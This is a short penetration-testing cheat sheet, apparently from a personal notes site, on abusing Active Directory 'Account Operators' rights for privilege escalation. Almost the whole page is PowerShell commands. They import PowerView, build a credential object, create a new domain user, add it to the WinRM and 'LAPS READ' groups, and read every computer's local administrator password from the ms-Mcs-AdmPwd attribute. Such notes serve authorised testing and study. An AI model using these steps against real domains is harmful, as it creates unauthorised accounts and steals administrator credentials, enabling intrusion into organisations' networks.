---
title: "Account Operators"
date: 2024-7-23
tags: ["Account Operators", "active driectory", "ad", "Windows", "LAPS", "privesc"]
---

---
### Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1 

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 3. Create new user password object

<div>

```powershell
$new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Force
```

</div>

#### 4. Create new user account

<div>

```powershell
# Create a new user
New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred
```

```powershell
# Grant new user privilege (e.g. WinRM)
Add-DomainGroupMember -Identity WinRM -Members <NEW_USER> -Credential $cred
```

</div>

#### 5. Add new user to LAPS group

<div>

```powershell
Add-DomainGroupMember -Identity 'LAPS READ' -Members <NEW_USER> -Credential $cred
```

</div>

#### 6. Read LAPS password

<div>

```powershell
# Login as new user
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
```

</div>

{{< /tabcontent >}}

<br>